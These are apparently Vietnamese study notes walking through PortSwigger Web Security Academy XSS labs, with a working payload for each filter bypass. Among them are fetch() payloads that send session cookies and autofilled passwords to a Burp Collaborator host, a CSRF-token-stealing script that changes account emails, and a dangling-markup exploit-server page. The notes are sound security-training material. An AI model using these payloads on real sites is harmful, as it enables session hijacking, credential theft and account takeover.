## DOM XSS in `innerHTML` sink using source `location.search`

- ở bài lab này: payload: `<img src=1 onerror=alert(1)>`
![](../../image/Pasted%20image%2020260503042804.png)
- **`<img>` (HTML Tag):** Đây là thẻ dùng để nhúng hình ảnh. Khi `innerHTML` nhận chuỗi này, trình duyệt sẽ phân giải nó thành một phần tử HTML thực thụ trong cây DOM.
- **`src=1` (Attribute):** Thuộc tính này chỉ định đường dẫn ảnh. Vì `1` không phải là một đường dẫn hợp lệ (file ảnh không tồn tại), trình duyệt sẽ **thất bại** trong việc tải ảnh.
- **`onerror=...` (Event Handler):** Đây là một "bẫy" sự kiện. Trình duyệt được lập trình rằng: "Nếu việc tải ảnh gặp lỗi (error), hãy thực thi đoạn mã JavaScript nằm trong thuộc tính này".
- **`alert(1)` (JavaScript Code):** Đây là hàm JavaScript được thực thi khi sự kiện `onerror` kích hoạt.

## DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
- ở bài lab này chúng ta có sự kết hợp giữa một nguồn dữ liệu (Source) và một điểm thực thi (Sink) thông qua thư viện jQuery:
- **Source (`location.search`):** Đây là nơi bắt đầu của cuộc tấn công. Tham số `returnPath` trong URL chứa chuỗi độc hại mà bạn nhập vào. JavaScript của trang web sẽ đọc giá trị này.
- **Sink (jQuery `href` attribute):** Trang web sử dụng jQuery để tìm một thẻ neo (anchor tag `<a>`) và thay đổi thuộc tính `href` của nó bằng giá trị lấy từ `returnPath`.
- **Giao thức `javascript:`:** Đây là điểm mấu chốt. Thông thường, `href` dùng để chứa liên kết (URL). Tuy nhiên, khi bạn sử dụng giao thức `javascript:`, trình duyệt sẽ không chuyển hướng trang web mà sẽ **thực thi đoạn mã JavaScript** đi kèm ngay lập tức khi người dùng click vào liên kết đó.
- inspect trang submit feedback: tìm returnpath
![](../../image/Pasted%20image%2020260503043339.png)


![](../../image/Pasted%20image%2020260503043430.png)

## DOM XSS in jQuery selector sink using a hashchange event

- ở bài lab này: khai thác cách jQuery xử lý các chuỗi nằm sau dấu thăng (`#`) trên URL
![](../../image/Pasted%20image%2020260503043917.png)
- **Source:** `location.hash` (phần nội dung sau dấu `#` trên thanh địa chỉ).
- **Sink:** Hàm `$()` của jQuery. Khi bạn đưa một chuỗi có dạng HTML vào hàm này, thay vì đi tìm phần tử, jQuery sẽ **tạo mới** phần tử đó ngay trong bộ nhớ.

Mục tiêu của bài là gọi hàm `print()`. Payload cơ bản nhất để kích hoạt JavaScript khi một thẻ HTML được render là dùng thẻ `<img>` với sự kiện lỗi: `<img src=x onerror=print()>` Khi payload này được đưa vào dấu `#`, URL sẽ có dạng: `https://[ID-LAB].web-security-academy.net/#<img src=x onerror=print()>`.

payload hoàn chỉnh: 
`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

![](../../image/Pasted%20image%2020260503044153.png)

## Reflected XSS into attribute with angle brackets HTML-encoded

![](../../image/Pasted%20image%2020260503044545.png)
- Dữ liệu người dùng được phản chiếu vào bên trong giá trị của một thuộc tính HTML (ví dụ: `value="..."`).
- **Logic:** Dù dấu `< >` bị encode, ta vẫn có thể thoát khỏi phạm vi thuộc tính hiện tại bằng dấu ngoặc kép (`"`) để chèn thuộc tính mới.
- **Payload:** `" onmouseover="alert(1)`: Phá vỡ cấu trúc thuộc tính gốc: `<input value="[...]">` thành `<input value="" onmouseover="alert(1)">`. Mã độc thực thi khi người dùng tương tác với phần tử (di chuột qua).

payload:`"onmouseover="alert(1)`
![](../../image/Pasted%20image%2020260503044651.png)


## Stored XSS into anchor `href` attribute with double quotes HTML-encoded

![](../../image/Pasted%20image%2020260503045110.png)


![](../../image/Pasted%20image%2020260503045417.png)

- Tham số `website` trong form comment (được lưu vào cơ sở dữ liệu của server).
- Thuộc tính `href` của thẻ anchor (`<a>`) hiển thị tên người bình luận.
- - Hệ thống đã thực hiện **HTML-encode** nhưng dữ liệu đầu vào lại được đặt làm **giá trị** của thuộc tính `href`

## Reflected XSS into a JavaScript string with angle brackets HTML encoded

![](../../image/Pasted%20image%2020260503045557.png)

- giá trị tìm kiếm nằm trong 1 cái script, và dấu <> đã được mã hóa 
![](../../image/Pasted%20image%2020260503045655.png)

cần thoát ra khỏi dấu ' ' để thực hiện script: `'-alert(1)-'`

![](../../image/Pasted%20image%2020260503045741.png)

## DOM XSS in `document.write` sink using source `location.search` inside a select element

- vào web, ở chức năng check stock
![](../../image/Pasted%20image%2020260503050009.png)
- **Source**: `location.search` (thông qua tham số `storeId` trên URL).
- **Sink**: `document.write`

- khi thêm thử `&storeId=nhatminh` vào đuôi url:, ta thấy nhatminh được thêm vào options

![](../../image/Pasted%20image%2020260503050117.png)
vì dữ liệu nằm trong thẻ `<option>`, ta cần đóng thẻ này và thẻ `<select>` cha của nó để chèn thẻ mới
payload: `</option></select><img src=x onerror=alert(1)>`, ta thêm vào sau storeid trên url

![](../../image/Pasted%20image%2020260503050308.png)

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

- thử tìm hiếm `<minh>` 

![](../../image/Pasted%20image%2020260503050701.png)

ta thấy chuỗi của mình xuất hiện trong một phần tử được điều khiển bởi AngularJS, có thuộc tính `ng-app`

- khi nhập thử: `{{7*7}}` thấy kết quả trả về là 49 => AngularJS đang xử lý và thực thi nội dung bên trong dấu ngoặc nhọn kép `{{ }}`
payload: `{{$on.constructor('alert(1)')()}}`: để truy cập trực tiếp vào các hàm thông qua constructor

## Reflected DOM XSS
- khi tìm kiếm `<minh>`, mở tab network (f12), ta thấy chuỗi của mình xuất hiện trong dữ liệu JSON trả về từ server
![](../../image/Pasted%20image%2020260503051300.png)

- ở file searchResult.js, có hàm eval xử lí dữ liệu từ js
![](../../image/Pasted%20image%2020260503051408.png)


- Vì dữ liệu nằm trong chuỗi JSON, cần "thoát" khỏi cấu trúc JSON để thực thi mã., Nếu server không thực hiện escape dấu ngoặc kép (`"`) và dấu gạch chéo ngược (`\`), hãy thử payload: 
`\"-alert(1)}//`

## Stored DOM XSS

- bình luận bất kì và quay lại post vào xem source
thấy có file js xử lí comment

![](../../image/Pasted%20image%2020260503052049.png)
![](../../image/Pasted%20image%2020260503052208.png)

- web sử dụng `.innerHTML`, nghĩa là trình duyệt sẽ thực thi bất kỳ thẻ HTML nào có trong nội dung bình luận.
- Payload: `<><img src=1 onerror=alert(1)>`

## Reflected XSS into HTML context with most tags and attributes blocked

- khi thử 1 số payload thông dụng, web sẽ báo lỗi, tường lửa đã chặn 
![](../../image/Pasted%20image%2020260503052725.png)

- sử dụng intruder để bruteforce xem có những tags nào được phép truy cập (danh sách cheat sheet được cấp để bruteforce)
![](../../image/Pasted%20image%2020260503053101.png)
![](../../image/Pasted%20image%2020260503053047.png)

- thấy body và xss là 2 thẻ được phép
- tiếp tục bruteforce xem event được phép với thẻ body
hầu hết trả về 400 nhưng có 1 số event trả về 200
![](../../image/Pasted%20image%2020260503053406.png)

- dùng event onsize
**Xây dựng Payload:*
- Vì `onresize` chỉ kích hoạt khi kích thước cửa sổ thay đổi, ta cần một cách để tự động kích hoạt nó mà không đợi nạn nhân tự tay co giãn trình duyệt.
- Sử dụng `<iframe>` để nạp trang chứa payload và dùng thuộc tính `width` để thay đổi kích thước, từ đó kích hoạt `onresize`
`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint%28%29%3E" onload=this.style.width='100px'></iframe>`

## Reflected XSS into HTML context with all tags blocked except custom ones
- khi thử search 1 số thẻ như body, img, script đều bị block
![](../../image/Pasted%20image%2020260503053922.png)
- nhưng lại ko chặn các customs tags
![](../../image/Pasted%20image%2020260503054002.png)

=> **Xây dựng Payload với Custom Tag:*
- Một thẻ tùy chỉnh có thể sử dụng các sự kiện chung như `onfocus`.
- Payload: `<xss-tag id=x onfocus=alert(1) tabindex=1>`
`tabindex=1` cho phép phần tử này nhận tiêu điểm (focus), và `onfocus` sẽ chạy mã độc khi phần tử được focus.


- Để nạn nhân không cần click hay nhấn Tab, chúng ta sử dụng dấu thăng (`#`) trên URL để trình duyệt tự động nhảy đến phần tử có `id` tương ứng và kích hoạt `onfocus`.
<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>


## Reflected XSS with some SVG markup allowed
- các thẻ như img, body, script đã bị chặn
![](../../image/Pasted%20image%2020260503174046.png)

- dùng burp brute force xem tags nào ko bị block
![](../../image/Pasted%20image%2020260503174458.png)

- Tiếp tục dùng Intruder để kiểm tra các thuộc tính/sự kiện (Attribute list) đi kèm với thẻ `<svg>`, thấy onbegin được phép sử dụng
![](../../image/Pasted%20image%2020260503174745.png)

- Sự kiện `onbegin` thường đi kèm với các thẻ hoạt họa trong SVG như `<animatetransform>
=> payload: `?search=<svg><animatetransform onbegin=alert(1)>`

![](../../image/Pasted%20image%2020260503174910.png)

## Reflected XSS in canonical link tag

![](../../image/Pasted%20image%2020260503175234.png)

- đây là thẻ canonical, khi thêm thử kí tự đặc biệt thì thấy các ký tự này được phản chiếu trực tiếp vào thuộc tính `href` của thẻ canonical
![](../../image/Pasted%20image%2020260503175635.png)

- Mục tiêu là thoát khỏi thuộc tính `href` và chèn thêm một thuộc tính sự kiện. Tuy nhiên, thẻ `<link>` không hỗ trợ các sự kiện phổ biến như `onload` hay `onerror`.
-  ta sẽ sử dụng các phím tắt (Access Keys) để kích hoạt JavaScript.
- Payload: `'accesskey='x'onclick='alert(1)`
![](../../image/Pasted%20image%2020260503180532.png)

## Reflected XSS into a JavaScript string with single quote and backslash escaped
- khi nhập minh'123 vào ô search, ở mã nguồn, nó bị biến thành: minh\'123
- khi nhập minh\123:
![](../../image/Pasted%20image%2020260503181234.png)

![](../../image/Pasted%20image%2020260503181323.png)

=> không thể dùng dấu nháy đơn để đóng biến JavaScript như bài trước được nữa.
- - Dù dữ liệu nằm trong biến JS, nhưng biến đó lại nằm trong cặp thẻ `<script>...</script>`.
- Trình duyệt khi đọc HTML sẽ ưu tiên tìm thẻ đóng `</script>` trước khi thực thi JavaScript.

payload: ![](../../image/Pasted%20image%2020260503181422.png)


## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
-

- khi nhập thử minh <'"> vào search, ở mã nguồn ta thấy
![](../../image/Pasted%20image%2020260503181545.png)
dấu <> và " đã bị html encode => ko thể dùng thẻ html, còn dấu ' thành \' => đã bị escape

**Bypass Backslash:**

- Lập trình viên thêm `\` vào trước `'` để nó không đóng được chuỗi. Nhưng nếu chúng ta tự nhập thêm một dấu `\`: 
- Khi nhập `\'`, server sẽ escape nó thành `\\\'`.
- **Kết quả:** Dấu `\` đầu tiên của server sẽ escape chính dấu `\` bạn nhập vào, làm cho dấu nháy đơn `'` cuối cùng trở nên "tự do" và có thể đóng chuỗi.

=> - Chúng ta cần: `\'` (để thoát chuỗi) + `;` (để kết thúc câu lệnh hiện tại) + `mã độc` + `//` (để comment phần thừa).
- Payload: `\';alert(1)//`

## Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

- khi comment 1 bình luận xong, vào xem mã nguồn, ta thấy dữ liệu nằm trong thuộc tính onclick()
- các dấu `< >` và `"` bị HTML-encoded (`&lt; &gt; &quot;`).
- Dấu `'` và `\` bị JavaScript-escaped (`\'` và `\\`
![](../../image/Pasted%20image%2020260503190647.png)

- - Vì đây là thuộc tính `onclick`, trình duyệt sẽ thực hiện một bước **HTML-decode** trước khi gửi chuỗi đó cho bộ máy thực thi JavaScript.
- Nếu ta nhập mã hóa HTML của dấu nháy đơn là `&apos;`, server sẽ không nhận ra đó là dấu nháy nên không thêm dấu `\` để escape.
- Khi trình duyệt đọc thẻ `<a>`, nó thấy `&apos;` và chuyển ngược nó về thành `'` ngay trong ngữ cảnh JavaScript.
Payload: `&apos;);alert(1);//`

![](../../image/Pasted%20image%2020260503191110.png)

## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

- khi nhập thử chuỗi minh <'"> thì các kí tự đã bị url encode
![](../../image/Pasted%20image%2020260503192006.png)

- **cú pháp `${...}` (Interpellation):**
- Dấu `${` và `}` thường không nằm trong danh sách bị Unicode-escape hoặc kể cả có bị escape, trình duyệt vẫn hiểu khi nó nằm trong Template Literal
- Cú pháp này cho phép bạn thực thi mã JavaScript trực tiếp ngay bên trong chuỗi mà không cần phải đóng chuỗi đó lạ
payload: `${alert(1)}`


## Exploiting cross-site scripting to steal cookies
- ở bài này, Thay vì dùng `alert()`, ta sử dụng các hàm như `fetch()` để gửi dữ liệu ra một server bên ngoài 
- sử dụng burp colla để exploit
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

comment đoạn script trên và ấn poll now, ta sẽ thấy session của admin ở 1 request trả về, copy session này và chặn bắt 1 gói tin ddeer thay sesssion vào và solved bài lab

![](../../image/Pasted%20image%2020260503195140.png)

## Exploiting cross-site scripting to capture passwords

- Lỗ hổng này thường được khai thác tại các trang có chức năng lưu trữ thông tin người dùng (như phần bình luận hoặc hồ sơ cá nhân). Khi một người dùng khác (hoặc Admin) vào xem, mã độc sẽ thực thi. Điểm mấu chốt là trình duyệt thường có tính năng **tự động điền mật khẩu (Auto-fill)** cho các form đăng nhập.

- sử dụng burp colla để exploit, sau khi comment,  ấn poll now trên burp
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">

- khi admin truy cập bài lab, sẽ có 1 http reqeust trả về
![](../../image/Pasted%20image%2020260503195812.png)


## Exploiting XSS to bypass CSRF defenses
- Thông thường, **CSRF Token** được sinh ra để đảm bảo rằng chỉ có các request từ chính trang web hợp lệ mới được thực hiện. Tuy nhiên, nếu một trang web có lỗ hổng **XSS**, kẻ tấn công có thể dùng JavaScript để "đọc trộm" Token này ngay trong trình duyệt của nạn nhân và đính kèm nó vào một request giả mạọ

![](../../image/Pasted%20image%2020260503201922.png)

- ở source code phần update email có 1 Anti-CSRF token ẩn. Điều này ngăn chặn các cuộc tấn công CSRF thông thường vì kẻ tấn công không thể biết trước giá trị token này

- vào phàn commment:
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>

- Sau khi nhấn **Post Comment**, mã độc sẽ được lưu lại.
- Khi Admin (nạn nhân) vào xem bài blog này, trình duyệt của họ sẽ tự động thực thi script:
    - Âm thầm truy cập `/my-account` để lấy token.
    - Tự động gửi request đổi email sang `test@test.com`

**Kỹ thuật khai thác:**
- **Same-Origin Policy (SOP) Bypass:** Vì script chạy ngay trên domain của trang web, nó có quyền đọc nội dung của các trang khác cùng origin (như `/my-account`).
- **Regex Extraction:** Dùng `/name="csrf" value="(\w+)"/` để lọc lấy chuỗi token nằm trong thuộc tính `value`.

## Reflected XSS with AngularJS sandbox escape without strings

![](../../image/Pasted%20image%2020260503210328.png)
- Dữ liệu được phản chiếu bên trong một ứng dụng AngularJS (thường nằm trong một thuộc tính như `ng-app`)

- Cấu trúc cơ bản để thoát Sandbox trong AngularJS thường là ghi đè các hàm prototype. Tuy nhiên, vì không có dấu nháy, ta không thể gọi `customer.name` hay các chuỗi trực tiếp. Ta sẽ tận dụng chính các đối tượng có sẵn như `toString()`.


sử dụng hàm `String.fromCharCode()` để tạo ra các ký tự dựa trên mã ASCII của chúng.
- Để lấy được class `String`, ta dùng: `toString().constructor`.
- Để tạo chuỗi `"alert(1)"`, ta truyền các mã ASCII: `fromCharCode(97,108,101,114,116,40,49,41)`
```
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```


## Reflected XSS in a JavaScript URL with some characters blocked

![](../../image/Pasted%20image%2020260503213412.png)
- ở mã nguồn thấy dữ liệu được phản chiếu trong 1 đường dẫn js

- thử chèn ';alert(1)// thì web trả về lỗi
![](../../image/Pasted%20image%2020260503213805.png)


Payload sử dụng: `&'},x=x=>{throw//onerror=alert,1337},toString=x,window+'' ,{x:'`

- **`'},...`**: Đầu tiên, dấu `'` và `}` được dùng để đóng chuỗi và đóng đối tượng (object) trong hàm `fetch` gốc, giúp ta thoát ra khỏi ngữ cảnh của hàm đó và bắt đầu viết mã JavaScript mới.
- **`x=x=>{throw//onerror=alert,1337}`**:
    - Vì `throw` là một câu lệnh (`statement`), nó không thể đứng một mình trong một danh sách biểu thức. Ta phải bao nó trong một **Arrow Function** (`x=>...`) để tạo ra một khối lệnh (block).
    - `//`: Dùng comment để thay thế cho khoảng trắng vì khoảng trắng bị hệ thống chặn.
    - `onerror=alert`: Gán hàm `alert` cho trình xử lý lỗi hệ thống. Khi có bất kỳ lỗi nào xảy ra, `alert` sẽ được gọi.
    - `throw ..., 1337`: Ném ra một ngoại lệ với giá trị `1337`. Giá trị này sẽ trở thành tham số đầu tiên của hàm `alert`.
- **`toString=x`**: Gán hàm `x` (arrow function vừa tạo) vào thuộc tính `toString` của đối tượng toàn cục `window`.
- **`window+''`**: Đây là bước kích hoạt. Khi thực hiện phép cộng `window` với một chuỗi rỗng, trình duyệt buộc phải thực hiện **ép kiểu (string conversion)**. Để làm việc này, nó sẽ tự động gọi hàm `window.toString()`.
- **`,{x:'`**: Đoạn này dùng để "hàn gắn" cú pháp với phần code còn thừa phía sau của ứng dụng, tránh gây ra lỗi cú pháp trước khi script kịp chạy.

## Reflected XSS with AngularJS sandbox escape and CSP
- thư viện angular 1.4.4 là phiên bản cũ có lỗ hổng Sandbox Escape
- 
![](../../image/Pasted%20image%2020260503220313.png)

![](../../image/Pasted%20image%2020260503220350.png)
- `ng-app`: Kích hoạt AngularJS trên toàn bộ phần body của trang web.
- **`ng-csp`**: Đây là directive yêu cầu AngularJS tuân thủ các quy tắc CSP (như không sử dụng `eval()` hoặc `Function()`). Tuy nhiên, chính vì có `ng-csp`, chúng ta mới cần đến kỹ thuật dùng `orderBy` để lách luật.
![](../../image/Pasted%20image%2020260503220456.png)

- dữ liệu được in thẳng ra thẻ `<h1>`. Vì thẻ `body` có `ng-app`, bất kỳ mã AngularJS nào chèn vào tham số `search` cũng sẽ được framework này xử lý.

payload: `<script> location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>`

 Kích hoạt tự động (Auto-triggering)
- **`<input id=x ...>#x`**: chèn một thẻ input có `id=x` và thêm `#x` vào cuối URL.
- **Cơ chế**: Khi trình duyệt tải trang, fragment `#x` điều hướng trang web nhảy đến phần tử có ID tương ứng. Hành động này vô tình kích hoạt sự kiện **focus** cho thẻ input mà không cần nạn nhân phải click chuột.
    
Lợi dụng sự kiện AngularJS (ng-focus)
- **`ng-focus`**: Đây là một chỉ thị (directive) của AngularJS. Khi thẻ input nhận focus, biểu thức bên trong nó sẽ được AngularJS thực thi.
    
Lấy đối tượng Window (Bypass Sandbox)
- **`$event.composedPath()`**: Hàm này trả về một mảng các đối tượng mà sự kiện đi qua (Event Path). Trong cấu trúc DOM, đối tượng cuối cùng của mảng này luôn là **`window`**.
- **Mục tiêu**: AngularJS Sandbox chặn việc truy cập trực tiếp vào biến `window`. Bằng cách dùng `composedPath()`, chúng ta lấy được `window` một cách gián tiếp từ mảng sự kiện.
    

Thực thi mã độc (orderBy Filter)
- **`| orderBy`**: Trong AngularJS, dấu `|` dùng để gọi các bộ lọc (filters). Bộ lọc `orderBy` sẽ duyệt qua từng phần tử trong mảng (mảng lấy từ `composedPath`).
- **`'(z=alert)(document.cookie)'`**: Đây là logic thực thi.
    - Nó gán hàm `alert` cho biến tạm `z`.
    - Khi `orderBy` duyệt đến phần tử cuối cùng của mảng (chính là đối tượng `window`), biểu thức này sẽ được thực thi ngay trong ngữ cảnh (scope) của `window`.
    - Kết quả: `alert(document.cookie)` được gọi thành công mà không vi phạm quy tắc chặn từ khóa `window` của Sandbox.

## Reflected XSS with event handlers and `href` attributes blocked
 - ở bài lab này WAF ứng dụng đã chặn sạch các **event handlers** (như `onmouseover`, `onclick`) và cả thuộc tính `href`.
![](../../image/Pasted%20image%2020260503220939.png)
Để giải quyết bài này, chúng ta cần tìm một "khe cửa hẹp" khác để thực thi JavaScript mà không cần đến những thứ bị chặn đó. 

- dùng burp bruteforce xem thẻ nào ko bị chặn
![](../../image/Pasted%20image%2020260503222204.png)


payload:
```
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```
- **Bypass bộ lọc `href`:**
    - Thông thường, WAF sẽ quét thẻ `<a href="javascript:...">`.
    - Tuy nhiên, trong payload này, thẻ `<a>` ban đầu **không hề có thuộc tính `href`**. Thuộc tính này chỉ được "sinh ra" sau đó bởi thẻ `<animate>`. Bộ lọc tĩnh (Static filter) thường không đủ thông minh để nhận ra sự kết hợp này.
- **Bypass bộ lọc sự kiện (Events):**
    - Payload này hoàn toàn không sử dụng bất kỳ từ khóa `on...` nào (như `onclick`, `onmouseover`). Vì vậy, dù WAF có chặn sạch các event handlers, nó vẫn để lọt payload này.
![](../../image/Pasted%20image%2020260503221927.png)

- **Cấu trúc lồng nhau:** Chúng ta lồng thẻ `<a>` bên trong thẻ `<svg>`. Trong ngữ cảnh SVG, thẻ `<a>` có khả năng nhận các thuộc tính hoạt họa.
- **Thẻ `<animate>`:** Đây là chìa khóa. Thẻ này dùng để thay đổi giá trị của một thuộc tính theo thời gian.
    - **`attributeName="href"`**: Chúng ta chỉ định rằng đích đến của việc thay đổi này là thuộc tính `href` của thẻ cha (thẻ `<a>`).
    - **`values="javascript:alert(1)"`**: Chúng ta gán giá trị độc hại vào thuộc tính `href` đó.
- **Kết quả:** Sau khi trình duyệt parse xong đoạn mã này, thẻ `<a>` sẽ sở hữu một thuộc tính `href` có giá trị là `javascript:alert(1)`.
- **Kích hoạt:** Khi người dùng click vào chữ **"Click me"** (được định nghĩa bởi thẻ `<text>`), trình duyệt sẽ thực thi giao thức `javascript:`, dẫn đến hàm `alert(1)` được gọi.


## Reflected XSS protected by CSP, with CSP bypass

- nhập thử payload: `<script>alert(1)</script>` và kiểm tra console
![](../../image/Pasted%20image%2020260503223038.png)
lỗi CSP báo rằng script bị chặn vì không nằm trong white list => XSS có tồn tại (vì payload xuất hiện trong HTML) nhưng bị CSP chặn

- quan sát các gói tin trên burp thấy tham số token:
Vì ứng dụng không kiểm tra tham số `token`, có thể dùng kỹ thuật **Header Injection** để chèn thêm các chỉ thị (directives) mới vào CSP bằng cách sử dụng dấu chấm phẩy (`;`).
![](../../image/Pasted%20image%2020260503224822.png)


Payload "Ghi đè" CSP: `?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27`
Chúng ta sẽ sử dụng chỉ thị `script-src-elem` để ghi đè lên quy tắc gốc.
- **Tham số `search`**: Chèn đoạn mã thực thi: `<script>alert(1)</script>`.
- **Tham số `token`**: Chèn chỉ thị cho phép chạy script inline: `;script-src-elem 'unsafe-inline'`.


## Reflected XSS protected by very strict CSP, with dangling markup attack

- khi login và thử tính năng thay đổi email, ở burp thử thay email bằng payload:
![](../../image/Pasted%20image%2020260503232110.png)


Vì không thể chạy script, chúng ta sẽ chèn một thẻ HTML hợp lệ để thay đổi hành vi của Form có sẵn trên trang. Sử dụng thuộc tính `formaction` và `formmethod` để ghi đè (override) đích đến của form:
- **Payload:** `foo@bar"><button formaction="URL_EXPLOIT_SERVER" formmethod="get">Click me</button>`
- **Cơ chế:** Khi nạn nhân click vào nút "Click me", toàn bộ dữ liệu trong form (bao gồm cả hidden CSRF token) sẽ bị gửi về Exploit Server của bạn dưới dạng tham số GET trên URL.


Tại **Exploit Server**, cần viết một đoạn mã để thực hiện 2 giai đoạn:
1. **Giai đoạn 1:** Lừa nạn nhân click vào nút để lấy CSRF Token.
2. **Giai đoạn 2:** Khi có Token, tự động thực hiện request đổi email của nạn nhân thành `hacker@evil-user.net`.

```
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://0a4e00fc047c2dbc8340145c00a900fb.web-security-academy.net/";
const exploitServer = "https://exploit-0a83000804412d7f83311354016a00f5.exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```